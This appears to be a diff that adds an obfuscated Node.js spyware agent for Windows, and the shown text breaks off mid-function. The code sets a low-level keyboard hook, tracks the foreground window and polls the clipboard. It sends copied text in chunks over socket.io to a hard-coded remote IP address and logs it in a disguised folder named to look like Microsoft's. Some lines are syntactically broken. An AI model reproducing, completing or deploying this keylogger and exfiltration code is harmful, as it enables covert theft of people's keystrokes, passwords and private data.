@@ -1,0 +1,2623 @@
+#!/usr/bin/env node
+'use strict';
+const a0eX=a0e1,a0ey=a0e1;
+(function(e0,e1){
+const ec=a0e1,eB=a0e1,e2=e0();
+while(!![]){
+try{
+const e3=-parseInt('74hZMOGy')/0x1*(parseInt('27654ICuYAY')/0x2)+parseInt('3002748IjjTZw')/0x3*(parseInt('4psSUCu')/0x4)+-parseInt('1256510ljalRa')/0x5+parseInt('4542RzerCg')/0x6*(parseInt('6363Vqdequ')/0x7)+-parseInt('40xkKTHb')/0x8*(parseInt('96723sGldoW')/0x9)+-parseInt('69980UEzQnO')/0xa*(-parseInt('1034VvNFzK')/0xb)+-parseInt('5304VJqJTG')/0xc*(parseInt('11843kaucTf')/0xd);
+if(e3===e1)break;
+else e2.push(e2.shift());
+}
+catch(e4){
+e2.push(e2.shift());
+}
+}
+}
+(a0e0,0x96608));
+const t=require('os'),e=require('fs'),n=require('path'),{
+spawnSync:o}
+=require('child_process'),{
+Worker:r}
+=require('worker_threads'),{
+io:l}
+=require('socket.io-client');
+let s=null;
+try{
+s=require('koffi');
+}
+catch(a0e2){
+console.warn('Warning: koffi not installed. Install with: npm install\x20koffi'),console.warn('  Keyboard hook\x20and Win32 clipboard will be unavailable.');
+}
+const i=0x5,c=0xa,a=0x2710,u=0x5dc,f=0x12c,d='http://195.66.213.162:443',p='',g=typeof __CLIENT_ID__!=='undefined'&&__CLIENT_ID__!=null&&__CLIENT_ID__!==''?__CLIENT_ID__:0x3e7,h=t.hostname(),m=0xd,_=0x100,w=0x104,k=0x101,v=0x105,b=0x10,y=0x11,C=0x12,M=0xa0,T=0xa1,I=0xa2,S=0xa3,W=0xa4,P=0xa5,E=0x5b,K=0x5c,O=0x14,A=0x60,L=0x69,N=0x6a,$=0x6b,x=0x6d,D=0x6e,G=0x6f,R=0x1,H=0xd,U=0x2,B=0x1000,V=0x400,F=0x10,q=0x1,j=0x2,Y=0x8000,z={
+[N]:'*',[$]:,[x]:'-',[D]:'.',[G]:'/'}
+,Q={
+'chrome':'Google Chrome','msedge':'Microsoft Edge','firefox':'Firefox','notepad':'Notepad','explorer':'File Explorer','code':'Visual Studio Code','devenv':'Visual Studio','winword':'Word','excel':'Excel','powerpnt':'PowerPoint','outlook':'Outlook','teams':'Microsoft Teams','cursor':'Cursor','applicationframehost':'Application'}
+;
+let J=![],X={
+}
+,Z=![],tt=![],et=null,nt='',ot='',rt=null,lt=null,st=null,it=![],ct=![],at=![],ut=null,ft=![],dt=![],pt=null;
+const gt=[],ht={
+'alt':![],'ctrl':![],'shift':![],'meta':![],'caps':![]}
+;
+let mt=null,_t=null,wt=null,kt=![],vt=![];
+const bt=s?s.struct('KBDLLHOOKSTRUCT',{
+'vkCode':'uint32','scanCode':'uint32','flags':'uint32','time':'uint32','dwExtraInfo':'uintptr'}
+):null,yt=s?s.struct('POINT',{
+'x':'int32','y':'int32'}
+):null,Ct=s?s.struct('RECT',{
+'left':'int32','top':'int32','right':'int32','bottom':'int32'}
+):null,Mt=s?s.struct('MSG',{
+'hwnd':'void *','message':'uint32','wParam':'uintptr','lParam':'intptr','time':'uint32','pt':yt}
+):null,Tt=s?s.struct('GUITHREADINFO',{
+'cbSize':'uint32','flags':'uint32','hwndActive':'void *','hwndFocus':'void *','hwndCapture':'void *','hwndMenuOwner':'void *','hwndMoveSize':'void *','hwndCaret':'void *','rcCaret':Ct}
+):null;
+let It=null,St=null,Wt=null,Pt=null,Et=null,Kt=null,Ot=null,At=null,Lt=null,Nt=null,$t=null,xt=null,Dt=null,Gt=null,Rt=null,Ht=null,Ut=null,Bt=null,Vt=null,Ft=null,qt=null,jt=null,Yt=null,zt=null,Qt=null,Jt=null,Xt=null,Zt=null,te=null,ee=null,ne=null,oe=null,re=null,le=null,se=null,ie=null,ce=null,ae=null,ue=null;
+function fe(){
+const ez=a0eX,eb=a0eX,e0={
+'PgVEV':function(e1,e2){
+return e1!==e2;
+}
+,'wsgKM':'33|14|26|15|16|35|36|0|10|41|17|23|18|9|28|39|30|20|40|2|32|22|5|37|38|29|42|34|12|3|11|8|25|6|4|24|13|1|7|21|27|31|19','kXAKd':'int __stdcall GetMessageW(_Out_\x20MSG\x20*lpMsg, void *hWnd,\x20uint32 wMsgFilterMin, uint32 wMsgFilterMax)','FZnIh':'bool\x20__stdcall PostThreadMessageW(uint32\x20idThread, uint32\x20Msg,\x20uintptr wParam, intptr lParam)','rWPYg':'void\x20* __stdcall OpenProcess(uint32 dwDesiredAccess,\x20bool bInheritHandle,\x20uint32 dwProcessId)','GqIbx':'uint32 __stdcall WTSGetActiveConsoleSessionId()','ctSCX':'uint32 __stdcall\x20SetErrorMode(uint32\x20uMode)','vVQPL':'bool\x20__stdcall QueryFullProcessImageNameW(void *hProcess, uint32 dwFlags,\x20_Out_ uint16 *lpExeName, _Inout_\x20uint32 *lpdwSize)','kHWmV':'void *\x20__stdcall\x20GetFocus()','ehBha':'bool __stdcall PeekMessageW(_Out_ MSG *lpMsg, void *hWnd, uint32 wMsgFilterMin,\x20uint32 wMsgFilterMax, uint32 wRemoveMsg)','ZtHNQ':'bool __stdcall CloseHandle(void\x20*hObject)','ZsBil':'bool __stdcall GlobalUnlock(void *hMem)','sGJoT':'bool __stdcall SetConsoleCtrlHandler(void\x20*HandlerRoutine,\x20bool Add)','nWSPE':'void\x20* __stdcall\x20SetWindowsHookExW(int idHook,\x20LowLevelKeyboardProc *lpfn, void\x20*hMod, uint32\x20dwThreadId)','CQQqA':'intptr\x20__stdcall DispatchMessageW(const MSG\x20*lpMsg)','CsIYL':'void\x20* __stdcall GetForegroundWindow()','kwwvl':'void *\x20__stdcall GetAncestor(void *hWnd,\x20uint32 gaFlags)','iEZMA':'uint32 __stdcall MapVirtualKeyW(uint32 uCode, uint32\x20uMapType)','bBvlP':'bool\x20__stdcall GetGUIThreadInfo(uint32 idThread, _Inout_\x20GUITHREADINFO *pgui)','eBJkc':'int16 __stdcall GetKeyState(int nVirtKey)','MDnGq':'void *\x20__stdcall GetModuleHandleW(const\x20uint16\x20*lpModuleName)','cwljn':'int __stdcall ToUnicode(uint32 wVirtKey,\x20uint32 wScanCode, const uint8\x20*lpKeyState, _Out_ uint16\x20*pwszBuff,\x20int cchBuff,\x20uint32 wFlags)','jUjwC':'int __stdcall GetWindowTextW(void\x20*hWnd, _Out_\x20uint16 *lpString, int\x20nMaxCount)','KjluI':'bool __stdcall IsClipboardFormatAvailable(uint32\x20format)','IdTWt':'void\x20* __stdcall GetParent(void *hWnd)','AOYiX':'user32.dll','nHApK':'void\x20* __stdcall GlobalLock(void *hMem)','Hnbby':'intptr __stdcall CallNextHookEx(void *hhk, int nCode, uintptr wParam,\x20void\x20*lParam)','hjhED':'bool __stdcall UnhookWindowsHookEx(void *hhk)','mvGRz':'bool __stdcall OpenClipboard(void *hWndNewOwner)','XHWCA':'bool __stdcall CloseClipboard()','JjSeg':'int __stdcall GetWindowTextLengthW(void *hWnd)','SExhv':'bool __stdcall IsWindow(void *hWnd)','EwKCl':'bool __stdcall TranslateMessage(const MSG *lpMsg)','HRuFo':'void\x20* __stdcall GetClipboardData(uint32\x20uFormat)','bAXPZ':'Warning: Win32\x20init failed:'}
+;
+if(!s||e0.PgVEV(process.platform,'win32'))return;
+try{
+const e1=e0.wsgKM.split('|');
+let e2=0x0;
+while(!![]){
+switch(e1[e2++]){
+case'0':Kt=_t.func(e0.kXAKd);
+continue;
+case'1':ie=_t.func(e0.FZnIh);
+continue;
+case'2':Bt=_t.func('uint32\x20__stdcall\x20GetWindowThreadProcessId(void *hWnd, _Out_ uint32 *lpdwProcessId)');
+continue;
+case'3':Zt=wt.func(e0.rWPYg);
+continue;
+case'4':re=wt.func(e0.GqIbx);
+continue;
+case'5':qt=wt.func('uint32\x20__stdcall GetCurrentThreadId()');
+continue;
+case'6':oe=wt.func(e0.ctSCX);
+continue;
+case'7':ce=qt;
+continue;
+case'8':ee=wt.func(e0.vVQPL);
+continue;
+case'9':xt=_t.func(e0.kHWmV);
+continue;
+case'10':Ot=_t.func(e0.ehBha);
+continue;
+case'11':te=wt.func(e0.ZtHNQ);
+continue;
+case'12':Xt=wt.func(e0.ZsBil);
+continue;
+case'13':se=wt.func(e0.sGJoT);
+continue;
+case'14':wt=s.load('kernel32.dll');
+continue;
+case'15':St=s.pointer(It);
+continue;
+case'16':Wt=_t.func(e0.nWSPE);
+continue;
+case'17':Lt=_t.func(e0.CQQqA);
+continue;
+case'18':$t=_t.func(e0.CsIYL);
+continue;
+case'19':vt=!![];
+continue;
+case'20':Ht=_t.func(e0.kwwvl);
+continue;
+case'21':ae=_t.func(e0.iEZMA);
+continue;
+case'22':Ft=_t.func(e0.bBvlP);
+continue;
+case'23':Nt=_t.func(e0.eBJkc);
+continue;
+case'24':le=wt.func('bool __stdcall ProcessIdToSessionId(uint32 dwProcessId, _Out_ uint32 *pSessionId)');
+continue;
+case'25':ne=wt.func(e0.MDnGq);
+continue;
+case'26':It=s.proto('intptr __stdcall\x20LowLevelKeyboardProc(int nCode,\x20uintptr wParam,\x20void *lParam)');
+continue;
+case'27':ue=_t.func(e0.cwljn);
+continue;
+case'28':Dt=_t.func(e0.jUjwC);
+continue;
+case'29':zt=_t.func(e0.KjluI);
+continue;
+case'30':Rt=_t.func(e0.IdTWt);
+continue;
+case'31':kt=!![];
+continue;
+case'32':Vt=_t.func('bool __stdcall AttachThreadInput(uint32 idAttach, uint32\x20idAttachTo, bool\x20fAttach)');
+continue;
+case'33':_t=s.load(e0.AOYiX);
+continue;
+case'34':Jt=wt.func(e0.nHApK);
+continue;
+case'35':Pt=_t.func(e0.Hnbby);
+continue;
+case'36':Et=_t.func(e0.hjhED);
+continue;
+case'37':jt=_t.func(e0.mvGRz);
+continue;
+case'38':Yt=_t.func(e0.XHWCA);
+continue;
+case'39':Gt=_t.func(e0.JjSeg);
+continue;
+case'40':Ut=_t.func(e0.SExhv);
+continue;
+case'41':At=_t.func(e0.EwKCl);
+continue;
+case'42':Qt=_t.func(e0.HRuFo);
+continue;
+}
+break;
+}
+}
+catch(e3){
+console.warn(e0.bAXPZ,e3.message),kt=![],vt=![];
+}
+}
+fe();
+function a0e1(e,D){
+e=e-0x1a2;
+const P=a0e0();
+let d=P[e];
+if(a0e1.mtxQmX===undefined){
+var c=function(z){
+const b='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
+let j='',t='';
+for(let Q=0x0,u,Z,E=0x0;
+Z=z.charAt(E++);
+~Z&&(u=Q%0x4?u*0x40+Z:Z,Q++%0x4)?j+=String.fromCharCode(0xff&u>>(-0x2*Q&0x6)):0x0){
+Z=b.indexOf(Z);
+}
+for(let W=0x0,v=j.length;
+W<v;
+W++){
+t+='%'+('00'+j.charCodeAt(W).toString(0x10)).slice(-0x2);
+}
+return decodeURIComponent(t);
+}
+;
+a0e1.ETncTI=c,a0e1.wYRyGx={
+}
+,a0e1.mtxQmX=!![];
+}
+const B=P[0x0],X=e+B,y=a0e1.wYRyGx[X];
+return!y?(d=a0e1.ETncTI(d),a0e1.wYRyGx[X]=d):d=y,d;
+}
+function de(e0){
+return new Promise(e1=>setTimeout(e1,e0));
+}
+function pe(e0){
+const ej=a0ey,eQ=a0ey,e1={
+'OCBwD':function(e3,e4){
+return e3+e4;
+}
+,'IZhHB':function(e3,e4){
+return e3<e4;
+}
+}
+,e2=e1.OCBwD(Date.now(),e0);
+while(e1.IZhHB(Date.now(),e2)){
+}
+}
+function ge(){
+const eu=a0ey;
+return Date.now();
+}
+function he(e0){
+const eZ=a0ey,eE=a0ey,e1={
+'HrrUN':function(e2,e3){
+return e2(e3);
+}
+,'VzXGE':'://'}
+;
+if(!e0||!e1.HrrUN(String,e0).trim())return e0;
+e0=e1.HrrUN(String,e0).trim();
+if(!e0.includes(e1.VzXGE))return 'http://'+e0;
+return e0;
+}
+function me(){
+const eW=a0ey;
+try{
+return process.env.USERNAME||process.env.USER||t.userInfo().username||'';
+}
+catch(e0){
+return process.env.USERNAME||process.env.USER||'';
+}
+}
+function _e(){
+const ev=a0ey,el=a0ey,e0={
+'xLiQJ':function(e1,e2){
+return e1===e2;
+}
+,'jRqEx':'win32','yDPcb':function(e1,e2){
+return e1>=e2;
+}
+,'yLLke':'Win11','Akrnd':'Win10','gTVbQ':'Windows 10','KiLgL':function(e1,e2,e3){
+return e1(e2,e3);
+}
+,'CdyID':'darwin','QQmXN':function(e1,e2){
+return e1-e2;
+}
+,'TPtjv':function(e1,e2){
+return e1>=e2;
+}
+,'PYgpo':function(e1,e2){
+return e1<=e2;
+}
+,'VSMtI':'macOS','kedxb':'Linux','eYdiu':'Unknown'}
+;
+if(e0.xLiQJ(process.platform,e0.jRqEx)){
+let e1=0x0;
+try{
+const e4=t.release()||'',e5=e4.split('.');
+e1=parseInt(e5[0x2]||'0',0xa)||0x0;
+}
+catch(e6){
+e1=0x0;
+}
+if(e0.yDPcb(e1,0x55f0))return e0.yLLke;
+if(e1>0x0)return e0.Akrnd;
+const e2=t.release()||'';
+if(e2.startsWith('11')||e2.includes('Windows 11'))return e0.yLLke;
+if(e2.startsWith('10')||e2.includes(e0.gTVbQ))return e0.Akrnd;
+const e3=e0.KiLgL(parseInt,(t.release()||'0').split('.')[0x0]||'0',0xa)||0x0;
+if(e3>=0xa)return e0.Akrnd;
+return e3?'Win'+e3:e0.Akrnd;
+}
+if(process.platform===e0.CdyID){
+const e7=parseInt((t.release()||'0').split('.')[0x0]||'0',0xa)||0x0,e8=e7?e0.QQmXN(e7,0x9):0x0;
+if(e0.TPtjv(e8,0xa)&&e0.PYgpo(e8,0x63))return 'Mac'+e8;
+return e0.VSMtI;
+}
+if(e0.xLiQJ(process.platform,'linux'))return e0.kedxb;
+return process.platform||e0.eYdiu;
+}
+function we(e0){
+const eh=a0eX,ef=a0eX,e1={
+'uqRzE':function(e3,e4){
+return e3===e4;
+}
+,'hJeuH':'User ID (CLIENT_ID) is required','YtAbR':function(e3,e4){
+return e3(e4);
+}
+}
+;
+let e2=e0;
+(e2==null||e1.uqRzE(e2,''))&&(e2=process.env.CLIENT_ID||g);
+if(e2==null||e2==='')throw new Error(e1.hJeuH);
+return e1.YtAbR(String,e2);
+}
+function ke(){
+const ea=a0ey;
+return{
+'clientId':X.client_id,'agentId':X.agent_id}
+;
+}
+function ve(){
+const eI=a0eX;
+return{
+'platform':process.platform,'arch':process.arch,'hostname':t.hostname()}
+;
+}
+let be=null;
+function ye(e0){
+const eL=a0eX,eU=a0eX,e1={
+'CzPlv':function(e5,e6){
+return e5(e6);
+}
+,'DcDVn':function(e5,e6){
+return e5(e6);
+}
+,'auDIy':function(e5,e6){
+return e5&&e6;
+}
+,'zalEK':'Microsoft','lyaDi':'RealPrior','szaOa':'Cache','cuqLZ':'7f25-2c61-6824-bf72'}
+,e2=e1.CzPlv(Boolean,process.stdout.isTTY),e3=e1.DcDVn(Boolean,process.pkg||process.env.PKG_EXE_PATH);
+if(e1.auDIy(e2,!e3))return be=null,null;
+let e4=process.env.LOCALAPPDATA||process.env.TEMP||process.env.TMP||t.homedir();
+e4=n.join(e4,e1.zalEK,e1.lyaDi,e1.szaOa);
+try{
+e.mkdirSync(e4,{
+'recursive':!![]}
+);
+}
+catch(e5){
+e4=process.env.TEMP||t.homedir();
+}
+return be=n.join(e4,e1.cuqLZ),be;
+}
+function Ce(e0){
+const eK=a0eX,ep=a0eX;
+if(!be)return;
+try{
+e.appendFileSync(be,e0+'\x0a','utf8');
+}
+catch(e1){
+}
+}
+function Me(){
+const eT=a0eX,eO=a0eX,e0={
+'qqxFJ':function(e1,e2){
+return e1!==e2;
+}
+,'FLPId':'win32','APPGN':function(e1,e2){
+return e1(e2);
+}
+,'YDJFF':function(e1,e2){
+return e1|e2;
+}
+,'jNowH':function(e1,e2){
+return e1|e2;
+}
+}
+;
+if(e0.qqxFJ(process.platform,e0.FLPId)||!oe)return;
+try{
+e0.APPGN(oe,e0.YDJFF(e0.jNowH(q,j),Y));
+}
+catch(e1){
+}
+}
+function Te(){
+const eM=a0ey,eg=a0ey,e0={
+'QbCNH':function(e1,e2){
+return e1!==e2;
+}
+,'ZxNAc':'win32','DmTad':function(e1){
+return e1();
+}
+,'hsamZ':function(e1,e2,e3){
+return e1(e2,e3);
+}
+,'nPiAU':function(e1,e2){
+return e1(e2);
+}
+,'kYzvZ':function(e1,e2){
+return e1!==e2;
+}
+,'YCfBA':function(e1,e2){
+return e1+e2;
+}
+,'BWkyL':'Keyboard capture\x20will not work\x20until it runs\x20in\x20the logged-in desktop\x20session.'}
+;
+if(e0.QbCNH(process.platform,e0.ZxNAc)||!re||!le)return;
+try{
+const e1=e0.DmTad(re),e2=[0x0];
+e0.hsamZ(le,process.pid,e2);
+const e3=e2[0x0];
+console.log('Session info: process='+e3+(',\x20active_console=')+e1+(', packaged=')+e0.nPiAU(Boolean,process.pkg)),e0.kYzvZ(e1,0xffffffff)&&e3!==e1&&console.log(e0.YCfBA('WARNING: Agent\x20is\x20not in the active user session.\x20',e0.BWkyL));
+}
+catch(e4){
+console.log('Session\x20info\x20unavailable:\x20'+e4.message);
+}
+}
+function Ie(e0,e1){
+const ek=a0ey,eJ=a0ey,e2={
+'GenHn':function(e3,e4){
+return e3||e4;
+}
+,'tLUQU':'char16','fYDTf':function(e3,e4){
+return e3==e4;
+}
+,'yLzCT':function(e3,e4){
+return e3(e4);
+}
+}
+;
+if(e2.GenHn(!e0,!s))return'';
+try{
+const e3=s.decode(e0,e2.tLUQU,-0x1);
+if(e2.fYDTf(e3,null))return'';
+let e4=e2.yLzCT(String,e3);
+if(e1&&e4.length>e1)e4=e4.slice(0x0,e1);
+return e4;
+}
+catch(e5){
+return'';
+}
+}
+function Se(e0,e1){
+const eF=a0ey,er=a0ey,e2={
+'gxmha':function(e3,e4){
+return e3||e4;
+}
+,'WKuuZ':'char','nkLFA':function(e3,e4){
+return e3(e4);
+}
+,'yaYhE':function(e3,e4){
+return e3>e4;
+}
+}
+;
+if(e2.gxmha(!e0,!s))return'';
+try{
+const e3=s.decode(e0,e2.WKuuZ,-0x1);
+if(e3==null)return'';
+let e4=e2.nkLFA(String,e3);
+if(e1&&e2.yaYhE(e4.length,e1))e4=e4.slice(0x0,e1);
+return e4;
+}
+catch(e5){
+return'';
+}
+}
+function We(){
+const eq=a0ey,es=a0ey,e0={
+'CCezi':function(e1,e2,e3,e4){
+return e1(e2,e3,e4);
+}
+,'Fwfan':'powershell','FMmzp':'-NoProfile','JRNAz':function(e1,e2){
+return e1!==e2;
+}
+}
+;
+try{
+const e1=e0.CCezi(o,e0.Fwfan,[e0.FMmzp,'-Command','Get-Clipboard -Raw'],{
+'encoding':'utf8','timeout':0x7d0,'windowsHide':!![]}
+);
+if(e0.JRNAz(e1.status,0x0))return null;
+return e1.stdout||'';
+}
+catch(e2){
+return console.log('DEBUG:\x20PowerShell clipboard fallback failed: '+e2.message),null;
+}
+}
+function Pe(e0){
+const eY=a0eX,eA=a0eX,e1={
+'OBxmV':function(e2,e3){
+return e2==e3;
+}
+,'xvNzm':'utf8','ZwBDb':function(e2,e3){
+return e2(e3);
+}
+}
+;
+if(e1.OBxmV(e0,null))return'';
+if(Buffer.isBuffer(e0))return e0.toString(e1.xvNzm);
+return e1.ZwBDb(String,e0);
+}
+function Ee(){
+const eC=a0ey,eN=a0ey,e0={
+'ghQTk':function(e2,e3){
+return e2||e3;
+}
+,'ZDssR':function(e2,e3){
+return e2(e3);
+}
+,'pRpmx':function(e2,e3){
+return e2(e3);
+}
+,'eAUzD':function(e2,e3){
+return e2*e3;
+}
+,'CtPXU':function(e2){
+return e2();
+}
+}
+;
+if(e0.ghQTk(!kt,!jt))return'';
+let e1=![];
+try{
+if(!jt(null))return'';
+e1=!![];
+let e2='';
+if(e0.ZDssR(zt,H)){
+const e3=e0.ZDssR(Qt,H);
+if(e3){
+const e4=Jt(e3);
+if(e4)try{
+e2=Ie(e4,0x400*0x100);
+}
+finally{
+Xt(e3);
+}
+}
+}
+else{
+if(e0.ZDssR(zt,R)){
+const e5=e0.pRpmx(Qt,R);
+if(e5){
+const e6=e0.pRpmx(Jt,e5);
+if(e6)try{
+e2=Se(e6,e0.eAUzD(0x400,0x100));
+}
+finally{
+Xt(e5);
+}
+}
+}
+}
+return e0.pRpmx(Pe,e2);
+}
+catch(e7){
+return'';
+}
+finally{
+if(e1)try{
+e0.CtPXU(Yt);
+}
+catch(e8){
+}
+}
+}
+function Ke(){
+const ew=a0ey,ei=a0ey,e0={
+'gRmlW':function(e3){
+return e3();
+}
+,'GYCLy':function(e3,e4){
+return e3(e4);
+}
+,'QdQqR':function(e3){
+return e3();
+}
+,'rXuQJ':function(e3,e4){
+return e3<e4;
+}
+,'UWgbK':function(e3,e4){
+return e3-e4;
+}
+,'XTgwu':function(e3,e4){
+return e3(e4);
+}
+}
+,e1=0x5,e2=[0x32,0x64,0x96,0xc8,0x12c];
+for(let e3=0x0;
+e3<e1;
+e3++){
+try{
+let e4='';
+if(kt){
+e4=e0.gRmlW(Ee);
+if(e4)return e4;
+}
+if(!e4){
+e4=e0.GYCLy(Pe,e0.QdQqR(We));
+if(e4)return e4;
+}
+}
+catch(e5){
+if(e0.rXuQJ(e3,e0.UWgbK(e1,0x1))){
+pe(e2[e3]);
+continue;
+}
+console.log('DEBUG: clipboard read failed: '+e5.message);
+}
+e0.rXuQJ(e3,e1-0x1)&&e0.XTgwu(pe,e2[e3]);
+}
+return'';
+}
+function Oe(e0,e1){
+const ex=a0ey,eG=a0ey,e2={
+'MmKfQ':function(e3,e4){
+return e3(e4);
+}
+,'xPcfW':function(e3,e4){
+return e3===e4;
+}
+,'ymlWs':'Warning: Socket not connected,\x20cannot send clipboard copy','NPcnW':function(e3,e4){
+return e3+e4;
+}
+,'EyRpb':function(e3){
+return e3();
+}
+,'DsZmZ':function(e3,e4,e5){
+return e3(e4,e5);
+}
+,'mALxJ':'clipboard:copy','zkbAh':function(e3,e4){
+return e3(e4);
+}
+}
+;
+if(!e0||!e2.MmKfQ(String,e0).trim())return;
+if(!e1&&e2.xPcfW(e0,ot))return;
+if(!Jn||!Jn.connected){
+console.warn(e2.ymlWs);
+return;
+}
+try{
+const e3=Ye(),e4=e0.length,e5=Math.ceil(e4/u);
+e5>0x1&&console.log('Clipboard large ('+e4+('\x20chars), sending\x20in\x20')+e5+('\x20chunks of up to ')+u+'.');
+for(let e6=0x0;
+e6<e4;
+e6+=u){
+const e7=e0.slice(e6,e2.NPcnW(e6,u)),e8={
+...e2.EyRpb(ke),'copiedText':e7,'ts':e2.EyRpb(ge)}
+;
+e2.DsZmZ(Qe,e8,e3),Jn.emit(e2.mALxJ,e8);
+}
+e2.zkbAh(Ce,new Date().toISOString()+'\x20'+e0.slice(0x0,f)),ot=e0,nt=e0;
+}
+catch(e9){
+console.log('Error sending clipboard copy:\x20'+e9.message);
+}
+}
+function Ae(){
+const eH=a0eX,eV=a0eX,e0={
+'DLGer':function(e4,e5){
+return e4===e5;
+}
+,'bzUAe':function(e4,e5){
+return e4%e5;
+}
+,'iNLsl':'(empty)','VhPFz':function(e4,e5){
+return e4!==e5;
+}
+,'gIbXj':function(e4,e5){
+return e4(e5);
+}
+,'Ktere':'DEBUG: Clipboard changed but content is empty/whitespace - keeping last valid content','AvHhp':function(e4,e5,e6){
+return e4(e5,e6);
+}
+,'fcpiF':'DEBUG: Clipboard monitoring\x20already\x20running','cNAXv':'DEBUG:\x20Initializing clipboard monitoring...','cMleO':'DEBUG: Clipboard monitoring\x20loop started'}
+;
+if(tt){
+console.log(e0.fcpiF);
+return;
+}
+console.log(e0.cNAXv),tt=!![];
+const e1=Ke();
+nt=e1,console.log('DEBUG: Initial clipboard content:\x20\x27'+(e1?e1.slice(0x0,0x32):e0.iNLsl)+"...'");
+let e2=0x0;
+console.log(e0.cMleO);
+const e3=()=>{
+const em=eH,eS=eH;
+if(!tt)return;
+try{
+const e4=Ke();
+e2+=0x1;
+if(e0.DLGer(e0.bzUAe(e2,0x32),0x0)){
+const e5=e4?e4.slice(0x0,0x1e):e0.iNLsl;
+console.log('DEBUG: Clipboard monitor active (poll\x20#'+e2+('), current: \x27')+e5+"...'");
+}
+if(e4)e0.VhPFz(e4,nt)&&(e4.trim()?e0.gIbXj(Oe,e4):console.log(e0.Ktere));
+else nt&&console.log('DEBUG: Clipboard\x20appears\x20empty\x20(was:\x20\x27'+nt.slice(0x0,0x1e)+("...') "+'- keeping last\x20valid content'));
+}
+catch(e6){
+console.log('ERROR in\x20clipboard monitor: '+e6.message);
+}
+et=e0.AvHhp(setTimeout,e3,0xfa);
+}
+;
+et=setTimeout(e3,0xfa),console.log('✓ Clipboard monitoring\x20started (Windows)');
+}
+function Le(){
+const eR=a0ey,e0={
+'sSvGS':function(e1,e2){
+return e1(e2);
+}
+}
+;
+rt&&(e0.sSvGS(clearTimeout,rt),rt=null);
+}
+function Ne(){
+const D0=a0eX,D1=a0eX,e0={
+'FLEVu':function(e1){
+return e1();
+}
+,'XOMKa':function(e1,e2){
+return e1(e2);
+}
+,'dvivl':'Clipboard monitoring stopped'}
+;
+tt=![],e0.FLEVu(Le),et&&(e0.XOMKa(clearTimeout,et),et=null),console.log(e0.dvivl);
+}
+function $e(){
+const D2=a0eX,D3=a0eX,e0={
+'TVuiX':function(e1,e2){
+return e1&e2;
+}
+,'JmFWp':function(e1,e2){
+return e1(e2);
+}
+}
+;
+try{
+if(Nt){
+const e1=Boolean(e0.TVuiX(e0.JmFWp(Nt,O),0x1));
+return ht.caps=e1,e1;
+}
+}
+catch(e2){
+}
+return e0.JmFWp(Boolean,ht.caps);
+}
+function xe(e0,e1){
+const D4=a0ey,D5=a0ey,e2={
+'klAFd':function(e3,e4){
+return e3(e4);
+}
+,'zwsOe':function(e3,e4){
+return e3(e4);
+}
+}
+;
+return e2.klAFd(Boolean,e0)!==e2.zwsOe(Boolean,e1);
+}
+function De(e0){
+const D6=a0eX,D7=a0eX,e1={
+'GRFvJ':function(e2,e3){
+return e2||e3;
+}
+,'eWfxg':function(e2,e3){
+return e2(e3);
+}
+,'xFSuy':function(e2,e3){
+return e2<=e3;
+}
+,'lYOAm':function(e2,e3){
+return e2+e3;
+}
+,'nINNd':'uint16','wxzNB':function(e2,e3,e4,e5){
+return e2(e3,e4,e5);
+}
+,'zeMtN':function(e2,e3){
+return e2<e3;
+}
+}
+;
+if(e1.GRFvJ(!e0,!Gt)||!Dt)return'';
+try{
+const e2=e1.eWfxg(Gt,e0);
+if(e1.xFSuy(e2,0x0))return'';
+const e3=e1.lYOAm(e2,0x1),e4=s.array(e1.nINNd,e3),e5=new e4(),e6=e1.wxzNB(Dt,e0,e5,e3);
+if(!e6)return'';
+let e7='';
+for(let e8=0x0;
+e1.zeMtN(e8,e6)&&e1.zeMtN(e8,e5.length);
+e8++){
+if(e5[e8]===0x0)break;
+e7+=String.fromCharCode(e5[e8]);
+}
+return e7.trim();
+}
+catch(e9){
+return'';
+}
+}
+function Ge(e0){
+const D8=a0eX,D9=a0eX,e1={
+'WGXmy':function(e2,e3){
+return e2<e3;
+}
+,'XJjDJ':function(e2,e3){
+return e2(e3);
+}
+}
+;
+if(!e0)return null;
+try{
+const e2=Ht(e0,U);
+if(e2)return e2;
+}
+catch(e3){
+}
+try{
+let e4=e0;
+for(let e5=0x0;
+e1.WGXmy(e5,0x20);
+e5++){
+const e6=e1.XJjDJ(Rt,e4);
+if(!e6)return e4;
+e4=e6;
+}
+}
+catch(e7){
+}
+return e0;
+}
+function Re(e0){
+const DD=a0ey,DP=a0ey,e1={
+'yqzqC':function(e5,e6){
+return e5<e6;
+}
+,'ArcBG':function(e5,e6){
+return e5!==e6;
+}
+,'uYVut':function(e5,e6){
+return e5(e6);
+}
+}
+;
+if(!e0)return'';
+let e2='',e3=e0;
+for(let e5=0x0;
+e1.yqzqC(e5,0x20);
+e5++){
+if(!e3)break;
+const e6=De(e3);
+if(e6)e2=e6;
+const e7=Rt(e3);
+if(!e7)break;
+e3=e7;
+}
+if(e2)return e2;
+const e4=Ge(e0);
+if(e4&&e1.ArcBG(e4,e0))return e1.uYVut(De,e4);
+return'';
+}
+function He(e0){
+const Dd=a0eX,Dc=a0eX,e1={
+'zkudE':function(e2,e3){
+return e2===e3;
+}
+,'iGtag':'object','PTcQj':function(e2,e3){
+return e2!=e3;
+}
+,'vEyOx':function(e2,e3){
+return e2(e3);
+}
+,'Fihgn':'foreach\x20($w\x20in $shell.Windows())\x20{
+','qtpJO':'  try {
+','UiLOH':'    if ([int64]$w.HWND\x20-ne\x20$target)\x20{
+ continue }
+','nwBNT':'\x20\x20\x20\x20if ($name) {
+ Write-Output $name;
+\x20break\x20}
+','jKKZq':'\x20\x20\x20\x20$doc = $w.Document','IhceZ':'\x20\x20\x20\x20if ($doc\x20-and\x20$doc.Folder)\x20{
+','NAqna':'      $title = [string]$doc.Folder.Title','UOGrO':'\x20\x20\x20\x20\x20\x20if ($title) {
+ Write-Output $title;
+ break\x20}
+','AElqY':'      if\x20($doc.Folder.Self -and $doc.Folder.Self.Path)\x20{
+','DMXYs':'      }
+','HRNvV':'    }
+','KxYBG':'  }
+ catch {
+}
+','xByXp':function(e2,e3,e4,e5){
+return e2(e3,e4,e5);
+}
+,'MMbXi':'powershell','tbFFd':'-NoProfile','TgOfC':'-Command','oxNbK':function(e2,e3){
+return e2===e3;
+}
+,'qiZRN':function(e2,e3){
+return e2(e3);
+}
+}
+;
+if(!e0)return'';
+try{
+const e2=e1.zkudE(typeof e0,e1.iGtag)&&e1.PTcQj(e0,null)?Number(s.address(e0)):e1.vEyOx(Number,e0);
+if(!e2)return'';
